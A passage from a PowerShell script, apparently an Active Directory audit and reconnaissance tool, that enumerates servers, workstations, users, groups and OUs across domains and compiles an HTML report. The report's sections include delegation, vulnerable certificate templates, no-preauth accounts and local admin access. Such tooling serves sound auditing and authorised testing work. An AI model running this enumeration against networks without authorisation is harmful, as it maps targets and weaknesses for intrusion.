				$HTMLOtherGroups = $TempOtherGroups2 | ConvertTo-Html -Fragment -PreContent "<h2>All Groups</h2>"
			}
		}
	}
	
	############################################
    ########### Servers (Enabled)###############
	############################################
	
	if($NoServers){}
    else{
        Write-Host ""
		Write-Host "Servers (Enabled):" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$ComputerServers = Get-DomainComputer -Domain $Domain -Server $Server -OperatingSystem "*Server*" -UACFilter NOT_ACCOUNTDISABLE
			$TempServersEnabled = foreach ($ComputerServer in $ComputerServers) {
				[PSCustomObject]@{
					"Name" = $ComputerServer.samaccountname
					"Enabled" = if ($ComputerServer.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($ComputerServer.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"IP Address" = (Resolve-DnsName -Name $ComputerServer.DnsHostName -Type A).IPAddress
					"Account SID" = $ComputerServer.objectsid
					"Operating System" = $ComputerServer.operatingsystem
					"Domain" = $Domain
					Description = $ComputerServer.description
				}
			}

			if ($TempServersEnabled) {
				$TempServersEnabled | Format-Table -AutoSize -Wrap
				$HTMLServersEnabled = $TempServersEnabled | ConvertTo-Html -Fragment -PreContent "<h2>Servers (Enabled)</h2>"
			}
		}
		else {
			$TempServersEnabled = foreach ($AllDomain in $AllDomains) {
				$ComputerServers = Get-DomainComputer -Domain $AllDomain -OperatingSystem "*Server*" -UACFilter NOT_ACCOUNTDISABLE
				foreach ($ComputerServer in $ComputerServers) {
					[PSCustomObject]@{
						"Name" = $ComputerServer.samaccountname
						"Enabled" = if ($ComputerServer.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if ($ComputerServer.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
						"IP Address" = (Resolve-DnsName -Name $ComputerServer.DnsHostName -Type A).IPAddress
						"Account SID" = $ComputerServer.objectsid
						"Operating System" = $ComputerServer.operatingsystem
						"Domain" = $AllDomain
						Description = $ComputerServer.description
					}
				}
			}

			if ($TempServersEnabled) {
				$TempServersEnabled | Format-Table -AutoSize -Wrap
				$HTMLServersEnabled = $TempServersEnabled | ConvertTo-Html -Fragment -PreContent "<h2>Servers (Enabled)</h2>"
			}
		}

    }
	
	#############################################
    ########### Servers (Disabled)###############
	#############################################
	
	if($NoServers){}
    else{
        Write-Host ""
		Write-Host "Servers (Disabled):" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$ComputerServers = Get-DomainComputer -Domain $Domain -Server $Server -OperatingSystem "*Server*" -UACFilter ACCOUNTDISABLE
			$TempServersDisabled = foreach ($ComputerServer in $ComputerServers) {
				[PSCustomObject]@{
					"Name" = $ComputerServer.samaccountname
					"Enabled" = if ($ComputerServer.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($ComputerServer.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"IP Address" = (Resolve-DnsName -Name $ComputerServer.DnsHostName -Type A).IPAddress
					"Account SID" = $ComputerServer.objectsid
					"Operating System" = $ComputerServer.operatingsystem
					"Domain" = $Domain
					Description = $ComputerServer.description
				}
			}

			if ($TempServersDisabled) {
				$TempServersDisabled | Format-Table -AutoSize -Wrap
				$HTMLServersDisabled = $TempServersDisabled | ConvertTo-Html -Fragment -PreContent "<h2>Servers (Disabled)</h2>"
			}
		}
		else {
			$TempServersDisabled = foreach ($AllDomain in $AllDomains) {
				$ComputerServers = Get-DomainComputer -Domain $AllDomain -OperatingSystem "*Server*" -UACFilter ACCOUNTDISABLE
				foreach ($ComputerServer in $ComputerServers) {
					[PSCustomObject]@{
						"Name" = $ComputerServer.samaccountname
						"Enabled" = if ($ComputerServer.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if ($ComputerServer.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
						"IP Address" = (Resolve-DnsName -Name $ComputerServer.DnsHostName -Type A).IPAddress
						"Account SID" = $ComputerServer.objectsid
						"Operating System" = $ComputerServer.operatingsystem
						"Domain" = $AllDomain
						Description = $ComputerServer.description
					}
				}
			}

			if ($TempServersDisabled) {
				$TempServersDisabled | Format-Table -AutoSize -Wrap
				$HTMLServersDisabled = $TempServersDisabled | ConvertTo-Html -Fragment -PreContent "<h2>Servers (Disabled)</h2>"
			}
		}

    }
	
	##################################################
    ########### Workstations (Enabled) ###############
	##################################################
	
	if(!$Workstations){}
    else{
        Write-Host ""
		Write-Host "Workstations (Enabled):" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$AllWorkstations = Get-DomainComputer -Domain $Domain -Server $Server -UACFilter NOT_ACCOUNTDISABLE | Where-Object { $_.OperatingSystem -notlike "*Server*" } | Sort-Object -Property DnsHostName
			$TempWorkstationsEnabled = foreach ($Workstation in $AllWorkstations) {
				[PSCustomObject]@{
					"Name" = $Workstation.samaccountname
					"Enabled" = if ($Workstation.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($Workstation.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"IP Address" = (Resolve-DnsName -Name $Workstation.DnsHostName -Type A).IPAddress
					"Account SID" = $Workstation.objectsid
					"Operating System" = $Workstation.operatingsystem
					"Domain" = $Domain
					Description = $Workstation.description
				}
			}

			if ($TempWorkstationsEnabled) {
				$TempWorkstationsEnabled | Format-Table -AutoSize -Wrap
				$HTMLWorkstationsEnabled = $TempWorkstationsEnabled | ConvertTo-Html -Fragment -PreContent "<h2>Workstations (Enabled)</h2>"
			}
		}
		else {
			$TempWorkstationsEnabled = foreach ($AllDomain in $AllDomains) {
				$AllWorkstations = Get-DomainComputer -Domain $AllDomain -UACFilter NOT_ACCOUNTDISABLE | Where-Object { $_.OperatingSystem -notlike "*Server*" } | Sort-Object -Property DnsHostName
				foreach ($Workstation in $AllWorkstations) {
					[PSCustomObject]@{
						"Name" = $Workstation.samaccountname
						"Enabled" = if ($Workstation.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if ($Workstation.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
						"IP Address" = (Resolve-DnsName -Name $Workstation.DnsHostName -Type A).IPAddress
						"Account SID" = $Workstation.objectsid
						"Operating System" = $Workstation.operatingsystem
						"Domain" = $AllDomain
						Description = $Workstation.description
					}
				}
			}

			if ($TempWorkstationsEnabled) {
				$TempWorkstationsEnabled | Format-Table -AutoSize -Wrap
				$HTMLWorkstationsEnabled = $TempWorkstationsEnabled | ConvertTo-Html -Fragment -PreContent "<h2>Workstations (Enabled)</h2>"
			}
		}

    }
	
	###################################################
    ########### Workstations (Disabled) ###############
	###################################################
	
	if(!$Workstations){}
    else{
        Write-Host ""
		Write-Host "Workstations (Disabled):" -ForegroundColor Cyan
		if ($Domain -and $Server) {
			$AllWorkstations = Get-DomainComputer -Domain $Domain -Server $Server -UACFilter ACCOUNTDISABLE | Where-Object { $_.OperatingSystem -notlike "*Server*" } | Sort-Object -Property DnsHostName
			$TempWorkstationsDisabled = foreach ($Workstation in $AllWorkstations) {
				[PSCustomObject]@{
					"Name" = $Workstation.samaccountname
					"Enabled" = if ($Workstation.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if ($Workstation.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
					"IP Address" = (Resolve-DnsName -Name $Workstation.DnsHostName -Type A).IPAddress
					"Account SID" = $Workstation.objectsid
					"Operating System" = $Workstation.operatingsystem
					"Domain" = $Domain
					Description = $Workstation.description
				}
			}

			if ($TempWorkstationsDisabled) {
				$TempWorkstationsDisabled | Format-Table -AutoSize -Wrap
				$HTMLWorkstationsDisabled = $TempWorkstationsDisabled | ConvertTo-Html -Fragment -PreContent "<h2>Workstations (Disabled)</h2>"
			}
		}
		else {
			$TempWorkstationsDisabled = foreach ($AllDomain in $AllDomains) {
				$AllWorkstations = Get-DomainComputer -Domain $AllDomain -UACFilter ACCOUNTDISABLE | Where-Object { $_.OperatingSystem -notlike "*Server*" } | Sort-Object -Property DnsHostName
				foreach ($Workstation in $AllWorkstations) {
					[PSCustomObject]@{
						"Name" = $Workstation.samaccountname
						"Enabled" = if ($Workstation.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if ($Workstation.lastlogontimestamp -ge $inactiveThreshold) { "Yes" } else { "No" }
						"IP Address" = (Resolve-DnsName -Name $Workstation.DnsHostName -Type A).IPAddress
						"Account SID" = $Workstation.objectsid
						"Operating System" = $Workstation.operatingsystem
						"Domain" = $AllDomain
						Description = $Workstation.description
					}
				}
			}

			if ($TempWorkstationsDisabled) {
				$TempWorkstationsDisabled | Format-Table -AutoSize -Wrap
				$HTMLWorkstationsDisabled = $TempWorkstationsDisabled | ConvertTo-Html -Fragment -PreContent "<h2>Workstations (Disabled)</h2>"
			}
		}

    }

	#####################################
    ########### Enabled Users ###########
	#####################################
	
	if (!$DomainUsers){}
	else {
		Write-Host ""
		Write-Host "Users (Enabled):" -ForegroundColor Cyan
		
		if ($Domain -and $Server) {
			$EnabledUsers = Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Domain $Domain -Server $Server
			$TempEnabledUsers = foreach ($EnabledUser in $EnabledUsers) {
				[PSCustomObject]@{
					"samaccountname" = $EnabledUser.samaccountname
					"objectsid" = $EnabledUser.objectsid
					"Domain" = $Domain
					"Groups" = (Get-DomainGroup -Domain $Domain -Server $Server -UserName $EnabledUser.samaccountname).Name -join ' - '
					"description" = $EnabledUser.description
				}
			}

			if ($TempEnabledUsers) {
				$TempEnabledUsers | Format-Table -AutoSize -Wrap
				$HTMLEnabledUsers = $TempEnabledUsers | ConvertTo-Html -Fragment -PreContent "<h2>Users (Enabled)</h2>"
			}
		}
		else {
			$TempEnabledUsers = foreach ($AllDomain in $AllDomains) {
				$EnabledUsers = Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Domain $AllDomain
				foreach ($EnabledUser in $EnabledUsers) {
					[PSCustomObject]@{
						"samaccountname" = $EnabledUser.samaccountname
						"objectsid" = $EnabledUser.objectsid
						"Domain" = $AllDomain
						"Groups" = (Get-DomainGroup -Domain $AllDomain -UserName $EnabledUser.samaccountname).Name -join ' - '
						"description" = $EnabledUser.description
					}
				}
			}

			if ($TempEnabledUsers) {
				$TempEnabledUsers | Format-Table -AutoSize -Wrap
				$HTMLEnabledUsers = $TempEnabledUsers | ConvertTo-Html -Fragment -PreContent "<h2>Users (Enabled)</h2>"
			}
		}
	}

	
	######################################
    ########### Disabled Users ###########
	######################################
	
	if (!$DomainUsers) {}
	else {
		Write-Host ""
		Write-Host "Users (Disabled):" -ForegroundColor Cyan
		
		if ($Domain -and $Server) {
			$DisabledUsers = Get-DomainUser -UACFilter ACCOUNTDISABLE -Domain $Domain -Server $Server
			$TempDisabledUsers = foreach ($DisabledUser in $DisabledUsers) {
				[PSCustomObject]@{
					"samaccountname" = $DisabledUser.samaccountname
					"objectsid" = $DisabledUser.objectsid
					"Domain" = $Domain
					"Groups" = (Get-DomainGroup -Domain $Domain -Server $Server -UserName $DisabledUser.samaccountname).Name -join ' - '
					"description" = $DisabledUser.description
				}
			}

			if ($TempDisabledUsers) {
				$TempDisabledUsers | Format-Table -AutoSize -Wrap
				$HTMLDisabledUsers = $TempDisabledUsers | ConvertTo-Html -Fragment -PreContent "<h2>Users (Disabled)</h2>"
			}
		}
		else {
			$TempDisabledUsers = foreach ($AllDomain in $AllDomains) {
				$DisabledUsers = Get-DomainUser -UACFilter ACCOUNTDISABLE -Domain $AllDomain
				foreach ($DisabledUser in $DisabledUsers) {
					[PSCustomObject]@{
						"samaccountname" = $DisabledUser.samaccountname
						"objectsid" = $DisabledUser.objectsid
						"Domain" = $AllDomain
						"Groups" = (Get-DomainGroup -Domain $AllDomain -UserName $DisabledUser.samaccountname).Name -join ' - '
						"description" = $DisabledUser.description
					}
				}
			}

			if ($TempDisabledUsers) {
				$TempDisabledUsers | Format-Table -AutoSize -Wrap
				$HTMLDisabledUsers = $TempDisabledUsers | ConvertTo-Html -Fragment -PreContent "<h2>Users (Disabled)</h2>"
			}
		}
	}
	
	######################################
    ########### Domain OUs ###########
	######################################
	
	if(!$DomainOUs){}
	else{
		Write-Host ""
		Write-Host "All Domain OUs:" -ForegroundColor Cyan

		if($Domain -AND $Server) {
			$TempAllDomainOUs = Get-DomainOU -Domain $Domain -Server $Server | ForEach-Object {
				$ou = $_
				$users = (Get-DomainUser -Domain $Domain -Server $Server -SearchBase "LDAP://$($_.DistinguishedName)").samaccountname
				$computers = Get-DomainComputer -Domain $Domain -Server $Server -SearchBase "LDAP://$($_.DistinguishedName)"

				$members = @()
				if ($users) { $members += $users }
				if ($computers) { $members += $computers.Name }

				[PSCustomObject]@{
					Name = $ou.Name
					Domain = $Domain
					Members = $members -join ' - '
				}
			}

			if($TempAllDomainOUs) {
				$TempAllDomainOUs | Format-Table -AutoSize -Wrap
				$HTMLAllDomainOUs = $TempAllDomainOUs | ConvertTo-Html -Fragment -PreContent "<h2>All Domain OUs</h2>"
			}
		}
		else{
			$TempAllDomainOUs = foreach($AllDomain in $AllDomains){
				Get-DomainOU -Domain $AllDomain | ForEach-Object {
					$ou = $_
					$users = (Get-DomainUser -Domain $AllDomain -SearchBase "LDAP://$($_.DistinguishedName)").samaccountname
					$computers = Get-DomainComputer -Domain $AllDomain -SearchBase "LDAP://$($_.DistinguishedName)"

					$members = @()
					if ($users) { $members += $users }
					if ($computers) { $members += $computers.Name }

					[PSCustomObject]@{
						Name = $ou.Name
						Domain = $AllDomain
						Members = $members -join ' - '
					}
				}
			}

			if($TempAllDomainOUs) {
				$TempAllDomainOUs | Format-Table -AutoSize -Wrap
				$HTMLAllDomainOUs = $TempAllDomainOUs | ConvertTo-Html -Fragment -PreContent "<h2>All Domain OUs</h2>"
			}
		}
	}

	
	#############################################
    ########### Output and Report ###############
	#############################################
    
    # Stop capturing the output and display it on the console
    Stop-Transcript | Out-Null
	
	$Report = ConvertTo-HTML -Body "$TopLevelBanner $HTMLEnvironmentTable $HTMLTargetDomain $HTMLKrbtgtAccount $HTMLdc $HTMLParentandChildDomains $HTMLDomainSIDsTable $HTMLForestDomain $HTMLForestGlobalCatalog $HTMLGetDomainTrust $HTMLTrustAccounts $HTMLTrustedDomainObjectGUIDs $HTMLGetDomainForeignGroupMember $HTMLBuiltInAdministrators $HTMLEnterpriseAdmins $HTMLDomainAdmins $HTMLGetCurrUserGroup $MisconfigurationsBanner $HTMLVulnCertTemplates $HTMLVulnCertComputers $HTMLVulnCertUsers $HTMLUnconstrained $HTMLConstrainedDelegationComputers $HTMLConstrainedDelegationUsers $HTMLRBACDObjects $HTMLPreWin2kCompatibleAccess $HTMLLMCompatibilityLevel $HTMLMachineQuota $HTMLUnsupportedHosts $InterestingDataBanner $HTMLReplicationUsers $HTMLServiceAccounts $HTMLGMSAs $HTMLUsersAdminCount $HTMLGroupsAdminCount $HTMLPrivilegedSensitiveUsers $HTMLPrivilegedNotSensitiveUsers $HTMLMachineAccountsPriv $HTMLnopreauthset $HTMLsidHistoryUsers $HTMLGPOCreators $HTMLGPOsWhocanmodify $HTMLGpoLinkResults $HTMLLAPSGPOs $HTMLLAPSCanRead $HTMLLapsEnabledComputers $HTMLAppLockerGPOs $HTMLGPOLocalGroupsMembership $HTMLGPOComputerAdmins $HTMLGPOMachinesAdminlocalgroup $HTMLUsersInGroup $HTMLFindLocalAdminAccess $HTMLFindDomainUserLocation $HTMLLoggedOnUsersServerOU $HTMLDomainShares $HTMLDomainShareFiles $HTMLInterestingFiles $HTMLACLScannerResults $HTMLLinkedDAAccounts $HTMLAdminGroups $HTMLGroupsByKeyword $AnalysisBanner $HTMLDomainPolicy $HTMLKerberosPolicy $HTMLUserAccountAnalysis $HTMLComputerAccountAnalysis $HTMLOperatingSystemsAnalysis $HTMLDomainGPOs $HTMLOtherGroups $HTMLServersEnabled $HTMLServersDisabled $HTMLWorkstationsEnabled $HTMLWorkstationsDisabled $UsersEnumBanner $HTMLEnabledUsers $HTMLDisabledUsers $HTMLAllDomainOUs" -Title "Active Directory Audit" -Head $header
	$HTMLOutputFilePath = $OutputFilePath.Replace(".txt", ".html")
	$Report | Out-File $HTMLOutputFilePath
	
	Write-Host ""
	Write-Host "Output files: " -ForegroundColor Yellow
	Write-Host "$OutputFilePath"
	Write-Host "$HTMLOutputFilePath"
	Write-Host ""
    
    # Clean up error lines from output
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'TerminatingError' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Parameter name: binaryForm""' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'PSEdition:' } | Set-Content $OutputFilePath
	(Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'PSRemotingProtocolVersion:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'PSCompatibleVersions:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'BuildVersion:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'CLRVersion:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'WSManStackVersion:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'PPSRemotingProtocolVersion:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'SerializationVersion:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'End time:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Windows PowerShell transcript end' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'PSVersion:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Process ID:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Host Application:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Configuration Name:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Start time:' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Windows PowerShell transcript start' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Transcript started, output file is' } | Set-Content $OutputFilePath
    (Get-Content $OutputFilePath) | Where-Object { $_ -notmatch 'Parameter name: enumType""' } | Set-Content $OutputFilePath
    
}
